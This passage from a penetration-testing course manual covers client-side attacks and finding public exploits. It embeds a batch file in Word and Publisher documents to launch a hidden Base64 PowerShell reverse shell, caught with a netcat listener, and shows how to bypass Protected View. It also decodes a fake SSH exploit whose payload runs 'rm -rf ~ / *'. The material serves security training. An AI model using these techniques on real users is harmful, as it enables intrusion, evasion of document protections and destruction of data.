
![](img/ec25e59d75726b7041242a56d3376832_435_0.png)

![](img/ec25e59d75726b7041242a56d3376832_435_1.png)

As soon as the victim accepts the warning, **cmd.exe** is launched. Once again, we have the ability to execute an arbitrary program and must convert this into execution of PowerShell with a Base64 encoded command. This time, the conversion is very simple, and we can simply change **cmd.exe** to the previously-used invocation of PowerShell as seen in Listing 400.

```
START powershell.exe -nop -w hidden -e JABzACAAcAPAQgAEA4AQZQBAACQATwBIAGoAZQB...
```

*Listing 400 · Batch file launching reverse shell*

After embedding the updated batch file, double-clicking it results in a working reverse shell.

```
kali@kali:~$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 50115
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Offsec>
```

*Listing 401 · Shell received from our OLE object*

### 13.3.3.1 Exercise

- 1. Use the PowerShell payload to create a batch file and embed it in a Microsoft Word document to send a reverse shell to your Kali system.

### 13.3.4 Evasion of Protected View

This Microsoft Word document is highly effective when served locally, but when served from the Internet, say through an email or a download link, we must bypass another layer of protection known as *Protected View*,³⁶² which disables all editing and modifications in the document and blocks the execution of macros or embedded objects.

To simulate this situation, we will copy the Microsoft Word document containing our embedded batch file to our Kali machine and host it on the Apache server. We can then download the document from the server and open it on our victim machine. At this point, *Protected View* is engaged as seen in Figure 254, and we can not execute the batch file.

![](img/ec25e59d75726b7041242a56d3376832_436_0.png)

While the victim may click *Enable Editing* and exit *Protected View*, this is unlikely. Ideally, we would prefer bypassing *Protected View* altogether, and one straightforward way to do this is to use another Office application.

Like Microsoft Word, Microsoft Publisher allows embedded objects and ultimately code execution in exactly the same manner as Word and Excel, but will not enable *Protected View* for Internet-delivered documents. We could use the tactics we previously applied to Word to bypass these restrictions, but the downside is that Publisher is less frequently installed than Word or Excel. Still, if your fingerprinting detects an installation of Publisher, this may be a viable and better vector.

### 13.3.4.1 Exercises

- 1. Trigger the protection by Protected View by simulating a download of the Microsoft Word document from the Internet.
- 2. Reuse the batch file and embed it in a Microsoft Publisher document to receive a reverse shell to your Kali system.
- 3. Move the file to the Apache web server to simulate the download of the Publisher document from the Internet and confirm the missing Protected View.

## 13.4 Wrapping Up

Client-side attack vectors are especially insidious as they exploit weaknesses in client software, such as a browser, as opposed to exploiting server software. This often involves some form of user interaction and deception in order for the client software to execute malicious code.

These attack vectors are particularly appealing for an attacker because they do not require direct or routable access to the victim’s machine.

³⁶² (Microsoft, 2019), https://support.office.com/en-us/article/what-is-protected-view-d6f09ac7-eeb9-4495-8e43-2bcdbcdb6653

![](img/ec25e59d75726b7041242a56d3376832_437_0.png)

In this module, we described some of the factors that are important to consider in this type of attack and walked through exploitation scenarios involving both malicious HTML Applications and Microsoft Word documents.

## 14. Locating Public Exploits

In this module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally-hosted exploits.

### 14.1 A Word of Caution

It is important to understand that by downloading and running public exploits, we can greatly endanger any system that runs that code. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Take, for example, OpenOwn, which was published as a remote exploit for SSH. While reading the source code, we noticed that it was asking for root privileges, which was immediately suspicious:

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc.");
  return 1;
}
```

Listing 402 · Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting jmpcode array:

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2F"
"\x64\x65\x76\x2F\x6e\x75\x6C\x6C\x20\x26\x26";
[...]
```

Listing 403 · Malicious SSH exploit hex encoded payload

Although it was masked as shellcode, the jmpcode character array was, in fact, a hex-encoded string containing a malicious shell command:

```
kali@kali:~$ python
>>> jmpcode = [
...   "\x72\x6D\x20\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2F"
...   "\x64\x65\x76\x2F\x6e\x75\x6C\x6C\x20\x26\x26"]
>>> print jmpcode
['rm -rf ~ / * 2> /dev/null &']
>>>
```

Listing 404 · Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the attacker’s UNIX-based filesystem. In the lines that followed, the program would connect to a public IRC server to announce the user’s idiocy to the world, making this an extremely dangerous, and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this module.

The online resources mentioned in this module analyze the submitted exploit code before hosting it online. Nevertheless, even when using these trusted resources, it is important to properly read the code and get a rough idea of what it will do upon execution. Even if you don’t consider yourself a programmer, this is a great way to improve your code-reading skills and may even save some embarrassment one day.

Exploits that are written in a low-level programming language and require compilation are often hosted in both source code and binary format. Source code is easier to inspect but may be cumbersome to compile. Binaries are more difficult to inspect (without specialized skills and tools) and are simpler to run.

If code inspection or compilation is too complex, set up a virtual machine with a clean snapshot as an exploit testing ground or “sandbox”.

### 14.2 Searching for Exploits

After the information gathering and enumeration stages of a penetration test, we can cross-check discovered software for known vulnerabilities in an attempt to find published exploits for those vulnerabilities.

#### 14.2.1 *Online Exploit Resources*

Various online resources host exploit code and make it available to the public for free. In this section, we will cover the three most popular online resources. These resources usually conduct tests on the submitted exploit code and remove any that are deemed fake or malicious.

##### 14.2.1.1 *The Exploit Database*

The Exploit Database³⁶³ is a project maintained by Offensive Security.³⁶⁴ It is a free archive of public exploits that are gathered through submissions, mailing lists, and public resources.

![](img/ec25e59d75726b7041242a56d3376832_439_0.png)

*Figure 255: The Exploit Database homepage*

![](img/ec25e59d75726b7041242a56d3376832_440_0.png)

In contrast to other online resources, The Exploit Database occasionally provides the installer for the vulnerable version of the software for research purposes. When the installer is available, it is marked with an icon on the website as indicated by the download box icon displayed in the **A** column in Figure 255.

Exploit Database updates are announced through the Twitter feed³⁶⁵ and an RSS feed³⁶⁶ is also available.

#### 14.2.1.2 SecurityFocus Exploit Archives

The SecurityFocus Exploit Archives³⁶⁷ website was created in 1999 and focuses on a few key areas important to the security community:

- *BugTraQ: A full disclosure mailing list with the purpose of discussing and announcing security vulnerabilities.
- *The SecurityFocus Vulnerability Database: Provides up-to-date information on vulnerabilities for all platforms and services.
- *SecurityFocus Mailing Lists: The topic-based mailing lists allow researchers around the world to discuss various security issues.

³⁶³ (Twitter, 2019), https://twitter.com/exploitdb
³⁶⁴ (Offensive Security, 2019), https://www.exploit-db.com/rss.xml
³⁶⁵ (SecurityFocus, 2019), https://www.securityfocus.com
